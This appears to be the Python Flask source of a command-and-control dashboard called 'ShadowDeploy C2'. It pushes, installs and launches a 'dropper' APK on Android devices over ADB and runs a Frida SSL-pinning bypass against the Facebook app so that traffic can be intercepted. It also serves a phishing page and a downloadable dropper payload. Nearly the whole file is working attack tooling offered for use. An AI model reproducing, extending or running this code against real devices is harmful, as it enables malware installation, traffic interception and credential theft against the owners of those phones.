import os, yaml, subprocess, threading, time, logging
from flask import Flask, jsonify, send_file, request, render_template_string
from datetime import datetime

app = Flask(__name__)

# Logging
os.makedirs('logs', exist_ok=True)
logging.basicConfig(filename='logs/c2.log', level=logging.INFO, 
                   format='%(asctime)s %(levelname)s %(message)s')

# Config
with open('config.yaml', 'r') as f:
    CONFIG = yaml.safe_load(f)

def adb(device_id=None, *cmd):
    """ADB wrapper Termux"""
    full_cmd = ['adb']
    if device_id: full_cmd += ['-s', device_id]
    full_cmd.extend(cmd)
    
    try:
        result = subprocess.run(full_cmd, capture_output=True, text=True, timeout=20)
        msg = f"ADB {device_id or 'global'}: {' '.join(cmd[:3])}... -> {result.returncode}"
        if result.returncode != 0:
            logging.error(msg + f" | {result.stderr}")
            return False, result.stderr
        logging.info(msg)
        return True, result.stdout
    except Exception as e:
        logging.error(f"ADB Error: {e}")
        return False, str(e)

def get_devices():
    """Lista dispositivos conectados"""
    ok, output = adb('devices', '-l')
    if ok:
        devices = []
        for line in output.splitlines():
            if '\tdevice' in line and not line.startswith('List'):
                dev_id = line.split('\t')[0]
                if dev_id != 'emulator-5554':  # Skip emulator
                    devices.append(dev_id)
        return devices
    return []

def device_status(device_id):
    """Estado del dropper en dispositivo"""
    ok, output = adb(device_id, 'shell', 'pm', 'list', 'packages', CONFIG['android']['dropper_pkg'])
    return "✅ INSTALADO" if ok and 'package:' in output else "❌ PENDIENTE"

@app.route('/')
def dashboard():
    devices = get_devices()
    status = {dev: device_status(dev) for dev in devices}
    
    html_template = '''
<!DOCTYPE html>
<html>
<head>
    <title>🕷️ ShadowDeploy C2</title>
    <meta http-equiv="refresh" content="5">
    <style>
        body { background:#111; color:#0f0; font-family:monospace; padding:30px; }
        h1 { color:#0ff; }
        table { width:100%; border-collapse:collapse; margin:20px 0; }
        th,td { border:1px solid #333; padding:12px; text-align:left; }
        .deploy { background:#0f0; color:#000; }
        .mitm { background:#00f; color:#fff; }
        .phish { background:#f0f; color:#000; }
        a { padding:10px 15px; text-decoration:none; border-radius:5px; margin:3px; }
        .status-ok { color:#0f0; } .status-pending { color:#ff0; }
    </style>
</head>
<body>
    <h1>🕷️ ShadowDeploy Framework - C2 Dashboard</h1>
    <h2>📱 Dispositivos activos: {{ devices|length }} | {{ now }}</h2>
    
    <table>
        <tr><th>Device ID</th><th>Status</th><th>Acciones</th></tr>
        {% for dev in devices %}
        <tr>
            <td>{{ dev[:25] }}</td>
            <td class="status-{{ 'ok' if status[dev].startswith('✅') else 'pending' }}">{{ status[dev] }}</td>
            <td>
                <a href="/deploy/{{ dev }}" class="deploy">🚀 Deploy Dropper</a>
                <a href="/mitm/{{ dev }}" class="mitm">🔬 Frida+MITM</a>
            </td>
        </tr>
        {% endfor %}
    </table>
    
    <hr>
    <div>
        <a href="/phishing" class="phish">📱 Phishing APK Link</a> |
        <a href="/api/next-video" style="background:#0a0;">🎬 Mock Video API</a> |
        <a href="/payloads/dropper.apk" download>⬇️ Dropper APK</a>
    </div>
</body>
</html>'''
    
    return render_template_string(html_template, devices=devices, status=status, 
                                now=datetime.now().strftime("%Y-%m-%d %H:%M:%S"))

@app.route('/deploy/<device_id>')
def deploy_dropper(device_id):
    """Despliega dropper completo en dispositivo"""
    steps = []
    
    # 1. Wireless ADB
    ok, out = adb(None, 'connect', f'{device_id}:5555')
    steps.append(f"ADB Connect: {ok}")
    
    # 2. Push dropper
    ok, out = adb(device_id, 'push', CONFIG['android']['dropper_path'], '/sdcard/Download/dropper.apk')
    steps.append(f"Push APK: {ok}")
    
    # 3. Install
    ok, out = adb(device_id, 'shell', 'pm', 'install', '-r', '/sdcard/Download/dropper.apk')
    steps.append(f"Install: {ok}")
    
    # 4. Launch
    ok, out = adb(device_id, 'shell', 'monkey', '-p', CONFIG['android']['dropper_pkg'], '1')
    steps.append(f"Launch: {ok}")
    
    logging.info(f"Full deploy {device_id}: {'✅' if all(ok for ok,_ in steps[1:]) else '❌'}")
    return jsonify({
        "status": "🚀 Dropper desplegado",
        "device": device_id,
        "steps": steps
    })

@app.route('/mitm/<device_id>')
def deploy_mitm(device_id):
    """Frida + MITM chain"""
    adb(device_id, 'push', '../2_frida_hooks/meta_ssl_bypass.js', '/data/local/tmp/')
    adb(device_id, 'shell', 'frida', '-U', '-l', '/data/local/tmp/meta_ssl_bypass.js', 
         '-f', 'com.facebook.katana', '--no-pause')
    return jsonify({"status": "🔬 Frida+MITM activo", "device": device_id})

@app.route('/phishing')
def phishing():
    return send_file('static/phishing.html')

@app.route('/payloads/<filename>')
def payloads(filename):
    return send_file(f'payloads/{filename}', as_attachment=True)

@app.route('/api/next-video', methods=['POST'])
def next_video():
    """Mock CDN API para playlist"""
    return jsonify({
        "video_url": "http://your-cdn.com/video.mp4",
        "title": "ShadowDeploy Payload Video",
        "next_id": "payload_001"
    })

if __name__ == '__main__':
    os.makedirs('payloads', exist_ok=True)
    print("🕷️ ShadowDeploy C2 activo → http://0.0.0.0:8080")
    print("📡 MITM: mitmdump -s ../1_mitm_injector/proxy_injector.py")
    print("🔬 Frida: frida -U -l ../2_frida_hooks/meta_ssl_bypass.js")
    app.run(host='0.0.0.0', port=8080, debug=False, threaded=True)